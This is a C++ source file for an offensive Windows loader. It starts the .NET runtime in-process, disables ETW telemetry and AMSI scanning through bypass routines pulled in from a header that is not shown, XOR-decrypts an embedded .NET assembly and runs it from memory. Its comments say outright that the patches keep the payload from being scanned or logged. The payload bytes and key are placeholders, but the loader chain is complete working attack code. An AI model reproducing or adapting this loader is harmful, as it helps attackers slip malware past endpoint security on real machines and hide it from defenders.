// loader_patched.cpp — Full chain: ETW patch → CLR start → AMSI patch → load → cleanup
//
// Cross-compile:
//   x86_64-w64-mingw32-g++ -O2 -municode -static-libgcc -static-libstdc++ \
//     -o loader.exe loader_patched.cpp -loleaut32 -lole32
//
// This is the C++ embedded-payload loader with AMSI/ETW bypasses integrated.
// Choose between direct patching and hardware breakpoints at compile time.

#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <initguid.h>
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _HDOMAINENUM_DEFINED
typedef void* HDOMAINENUM;
#define _HDOMAINENUM_DEFINED
#endif

// Pull in AMSI/ETW bypass primitives
#include "patches.h"

// === COM GUIDs ===
static const GUID CLSID_CLRMetaHost =
    {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
static const GUID IID_ICLRMetaHost =
    {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const GUID CLSID_CorRuntimeHost =
    {0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
static const GUID IID_ICorRuntimeHost =
    {0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

// === COM Interfaces ===
#undef INTERFACE
#define INTERFACE ICLRMetaHost
DECLARE_INTERFACE_(ICLRMetaHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID, void**) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetRuntime)(THIS_ LPCWSTR, REFIID, LPVOID*) PURE;
    STDMETHOD(GetVersionFromFile)(THIS_ LPCWSTR, LPWSTR, DWORD*) PURE;
    STDMETHOD(EnumerateInstalledRuntimes)(THIS_ void**) PURE;
    STDMETHOD(EnumerateLoadedRuntimes)(THIS_ HANDLE, void**) PURE;
    STDMETHOD(RequestRuntimeLoadedNotification)(THIS_ void*) PURE;
    STDMETHOD(QueryLegacyV2RuntimeBinding)(THIS_ REFIID, LPVOID*) PURE;
    STDMETHOD(ExitProcess)(THIS_ INT32) PURE;
};
#undef INTERFACE
#define INTERFACE ICLRRuntimeInfo
DECLARE_INTERFACE_(ICLRRuntimeInfo, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID, void**) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetVersionString)(THIS_ LPWSTR, DWORD*) PURE;
    STDMETHOD(GetRuntimeDirectory)(THIS_ LPWSTR, DWORD*) PURE;
    STDMETHOD(IsLoaded)(THIS_ HANDLE, BOOL*) PURE;
    STDMETHOD(LoadErrorString)(THIS_ UINT, LPWSTR, DWORD*, LONG) PURE;
    STDMETHOD(LoadLibrary)(THIS_ LPCWSTR, HMODULE*) PURE;
    STDMETHOD(GetProcAddress)(THIS_ LPCSTR, LPVOID*) PURE;
    STDMETHOD(GetInterface)(THIS_ REFCLSID, REFIID, LPVOID*) PURE;
    STDMETHOD(IsLoadable)(THIS_ BOOL*) PURE;
    STDMETHOD(SetDefaultStartupFlags)(THIS_ DWORD, LPCWSTR) PURE;
    STDMETHOD(GetDefaultStartupFlags)(THIS_ DWORD*, LPWSTR, DWORD*) PURE;
    STDMETHOD(BindAsLegacyV2Runtime)(THIS) PURE;
    STDMETHOD(IsStarted)(THIS_ BOOL*, DWORD*) PURE;
};
#undef INTERFACE
#define INTERFACE ICorRuntimeHost
DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID, void**) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(CreateLogicalThreadState)(THIS) PURE;
    STDMETHOD(DeleteLogicalThreadState)(THIS) PURE;
    STDMETHOD(SwitchInLogicalThreadState)(THIS_ DWORD*) PURE;
    STDMETHOD(SwitchOutLogicalThreadState)(THIS_ DWORD**) PURE;
    STDMETHOD(LocksHeldByLogicalThread)(THIS_ DWORD*) PURE;
    STDMETHOD(MapFile)(THIS_ HANDLE, HMODULE*) PURE;
    STDMETHOD(GetConfiguration)(THIS_ void**) PURE;
    STDMETHOD(Start)(THIS) PURE;
    STDMETHOD(Stop)(THIS) PURE;
    STDMETHOD(CreateDomain)(THIS_ LPCWSTR, IUnknown*, IUnknown**) PURE;
    STDMETHOD(GetDefaultDomain)(THIS_ IUnknown**) PURE;
    STDMETHOD(EnumDomains)(THIS_ HDOMAINENUM*) PURE;
    STDMETHOD(NextDomain)(THIS_ HDOMAINENUM, IUnknown**) PURE;
    STDMETHOD(CloseEnum)(THIS_ HDOMAINENUM) PURE;
    STDMETHOD(CreateDomainEx)(THIS_ LPCWSTR, IUnknown*, IUnknown*, IUnknown**) PURE;
    STDMETHOD(CreateDomainSetup)(THIS_ IUnknown**) PURE;
    STDMETHOD(CreateEvidence)(THIS_ IUnknown**) PURE;
    STDMETHOD(UnloadDomain)(THIS_ IUnknown*) PURE;
    STDMETHOD(CurrentDomain)(THIS_ IUnknown**) PURE;
};
#undef INTERFACE

typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);

static const GUID GUID_Zero = {0,0,0,{0,0,0,0,0,0,0,0}};

static HRESULT DispatchCall(IDispatch* d, LPCOLESTR name, WORD flags, DISPPARAMS* p, VARIANT* r) {
    DISPID id;
    OLECHAR* n[] = { (OLECHAR*)name };
    HRESULT hr = d->GetIDsOfNames(GUID_Zero, n, 1, LOCALE_SYSTEM_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    return d->Invoke(id, GUID_Zero, LOCALE_SYSTEM_DEFAULT, flags, p, r, NULL, NULL);
}

static void XorDecrypt(unsigned char* data, unsigned int len,
                       const unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

// ============================================================================
//  PAYLOAD SECTION
// ============================================================================

static unsigned char encryptedAssembly[] = {
    // PASTE ENCRYPTED BYTES HERE
    0x00  // placeholder
};
static unsigned int encryptedAssemblyLen = sizeof(encryptedAssembly);

static unsigned char xorKey[] = {
    // PASTE XOR KEY HERE
    0x00  // placeholder
};
static unsigned int xorKeyLen = sizeof(xorKey);

static LPCWSTR assemblyArgs[] = { NULL };
static int assemblyArgCount = 0;

// DLL invocation — set both to invoke a specific type/method instead of EntryPoint
// Leave empty to use EntryPoint (default, for .NET EXEs)
static LPCWSTR targetType   = L"";  // e.g. L"Namespace.ClassName"
static LPCWSTR targetMethod = L"";  // e.g. L"Execute"

// ============================================================================
//  Choose bypass method — flip this to PATCH_HWBP for hardware breakpoints
// ============================================================================
static const PatchMethod BYPASS_METHOD = PATCH_DIRECT;

// ============================================================================
//  Execution chain
// ============================================================================

int wmain(int argc, wchar_t* argv[]) {
    (void)argc; (void)argv;
    HRESULT hr;
    int result = 1;

    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pDomainThunk = NULL;
    IDispatch* pDomainDisp = NULL;
    BOOL started = FALSE;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // --- Step 1: Patch ETW BEFORE the CLR starts ---
    // This prevents .NET runtime telemetry from firing during CLR init
    PatchEtw(BYPASS_METHOD);

    // --- Step 2: Start the CLR ---
    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    pfnCLRCreateInstance fnCreate = hMscoree
        ? (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance") : NULL;
    if (!fnCreate) goto cleanup;

    hr = fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) goto cleanup;
    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) goto cleanup;

    {
        BOOL loadable = FALSE;
        pRuntimeInfo->IsLoadable(&loadable);
        if (!loadable) goto cleanup;
    }

    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) goto cleanup;

    hr = pRuntimeHost->Start();
    if (FAILED(hr)) goto cleanup;
    started = TRUE;

    // --- Step 3: Patch AMSI AFTER CLR start (amsi.dll now loaded) ---
    // This prevents Assembly.Load from scanning our payload
    PatchAmsi(BYPASS_METHOD);

    // --- Step 4: Create isolated AppDomain ---
    hr = pRuntimeHost->CreateDomain(L"Loader", NULL, &pDomainThunk);
    if (FAILED(hr)) goto cleanup;
    hr = pDomainThunk->QueryInterface(IID_IDispatch, (void**)&pDomainDisp);
    if (FAILED(hr)) goto cleanup;

    // --- Step 5: Decrypt payload ---
    {
        unsigned char* cleartext = (unsigned char*)VirtualAlloc(
            NULL, encryptedAssemblyLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!cleartext) goto cleanup;

        memcpy(cleartext, encryptedAssembly, encryptedAssemblyLen);
        XorDecrypt(cleartext, encryptedAssemblyLen, xorKey, xorKeyLen);

        // --- Step 6: Load assembly from byte array ---
        SAFEARRAYBOUND bounds = { encryptedAssemblyLen, 0 };
        SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
        void* pvData = NULL;
        SafeArrayAccessData(psa, &pvData);
        memcpy(pvData, cleartext, encryptedAssemblyLen);
        SafeArrayUnaccessData(psa);

        // Wipe decrypted payload immediately after copying to SAFEARRAY
        SecureZeroMemory(cleartext, encryptedAssemblyLen);
        VirtualFree(cleartext, 0, MEM_RELEASE);

        VARIANT vtArg;
        VariantInit(&vtArg);
        vtArg.vt = VT_ARRAY | VT_UI1;
        vtArg.parray = psa;
        DISPPARAMS lp = { &vtArg, NULL, 1, 0 };
        VARIANT vtAsm;
        VariantInit(&vtAsm);
        hr = DispatchCall(pDomainDisp, L"Load", DISPATCH_METHOD, &lp, &vtAsm);
        SafeArrayDestroy(psa);
        if (FAILED(hr)) goto cleanup;

        // --- Step 7: Resolve target method ---
        IDispatch* pAsm = vtAsm.pdispVal;
        IDispatch* pMethod = NULL;
        VARIANT vtInstance;
        VariantInit(&vtInstance);

        if (targetType[0] != L'\0' && targetMethod[0] != L'\0') {
            BSTR bstrType = SysAllocString(targetType);
            VARIANT vtTN;
            VariantInit(&vtTN);
            vtTN.vt = VT_BSTR;
            vtTN.bstrVal = bstrType;
            DISPPARAMS gtp = { &vtTN, NULL, 1, 0 };
            VARIANT vtType;
            VariantInit(&vtType);
            hr = DispatchCall(pAsm, L"GetType", DISPATCH_METHOD, &gtp, &vtType);
            SysFreeString(bstrType);
            if (FAILED(hr) || !vtType.pdispVal) { pAsm->Release(); goto cleanup; }

            IDispatch* pType = vtType.pdispVal;
            BSTR bstrMN = SysAllocString(targetMethod);
            VARIANT gmArgs[2];
            VariantInit(&gmArgs[0]);
            gmArgs[0].vt = VT_I4;
            gmArgs[0].lVal = 60;
            VariantInit(&gmArgs[1]);
            gmArgs[1].vt = VT_BSTR;
            gmArgs[1].bstrVal = bstrMN;
            DISPPARAMS gmp = { gmArgs, NULL, 2, 0 };
            VARIANT vtMI;
            VariantInit(&vtMI);
            hr = DispatchCall(pType, L"GetMethod", DISPATCH_METHOD, &gmp, &vtMI);
            SysFreeString(bstrMN);
            pType->Release();
            if (FAILED(hr) || !vtMI.pdispVal) { pAsm->Release(); goto cleanup; }

            pMethod = vtMI.pdispVal;

            DISPPARAMS np2 = { NULL, NULL, 0, 0 };
            VARIANT vtIS;
            VariantInit(&vtIS);
            DispatchCall(pMethod, L"IsStatic", DISPATCH_PROPERTYGET, &np2, &vtIS);
            BOOL isStatic = (vtIS.vt == VT_BOOL && vtIS.boolVal != VARIANT_FALSE);

            if (!isStatic) {
                BSTR bstrType2 = SysAllocString(targetType);
                VARIANT vtTN2;
                VariantInit(&vtTN2);
                vtTN2.vt = VT_BSTR;
                vtTN2.bstrVal = bstrType2;
                DISPPARAMS cip = { &vtTN2, NULL, 1, 0 };
                hr = DispatchCall(pAsm, L"CreateInstance", DISPATCH_METHOD, &cip, &vtInstance);
                SysFreeString(bstrType2);
                if (FAILED(hr)) { pMethod->Release(); pAsm->Release(); goto cleanup; }
            }
        } else {
            DISPPARAMS np = { NULL, NULL, 0, 0 };
            VARIANT vtEP;
            VariantInit(&vtEP);
            hr = DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &np, &vtEP);
            if (FAILED(hr) || !vtEP.pdispVal) { pAsm->Release(); goto cleanup; }
            pMethod = vtEP.pdispVal;
        }

        // --- Step 8: Build args and invoke ---
        VARIANT vtArgs;
        VariantInit(&vtArgs);
        if (assemblyArgCount > 0 && assemblyArgs[0] != NULL) {
            SAFEARRAYBOUND ab = { (ULONG)assemblyArgCount, 0 };
            SAFEARRAY* sa = SafeArrayCreate(VT_BSTR, 1, &ab);
            for (int i = 0; i < assemblyArgCount; i++) {
                long idx = i;
                BSTR b = SysAllocString(assemblyArgs[i]);
                SafeArrayPutElement(sa, &idx, b);
                SysFreeString(b);
            }
            vtArgs.vt = VT_ARRAY | VT_BSTR;
            vtArgs.parray = sa;
        }

        SAFEARRAYBOUND pb = { 1, 0 };
        SAFEARRAY* psaP = SafeArrayCreate(VT_VARIANT, 1, &pb);
        long idx = 0;
        SafeArrayPutElement(psaP, &idx, &vtArgs);

        VARIANT ia[2];
        VariantInit(&ia[0]);
        ia[0].vt = VT_ARRAY | VT_VARIANT;
        ia[0].parray = psaP;
        ia[1] = vtInstance;

        DISPPARAMS ip = { ia, NULL, 2, 0 };
        VARIANT vtR;
        VariantInit(&vtR);
        hr = DispatchCall(pMethod, L"Invoke", DISPATCH_METHOD, &ip, &vtR);
        result = SUCCEEDED(hr) ? 0 : 1;

        VariantClear(&vtR);
        SafeArrayDestroy(psaP);
        if (vtArgs.vt != VT_EMPTY) VariantClear(&vtArgs);
        if (vtInstance.vt != VT_EMPTY) VariantClear(&vtInstance);
        pMethod->Release();
        pAsm->Release();
    }

cleanup:
    // --- Step 8: Cleanup ---
    if (pDomainDisp) pDomainDisp->Release();
    if (pDomainThunk && pRuntimeHost) pRuntimeHost->UnloadDomain(pDomainThunk);
    if (pDomainThunk) pDomainThunk->Release();
    if (pRuntimeHost) { if (started) pRuntimeHost->Stop(); pRuntimeHost->Release(); }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();

    CleanupPatches();
    CoUninitialize();

    return result;
}
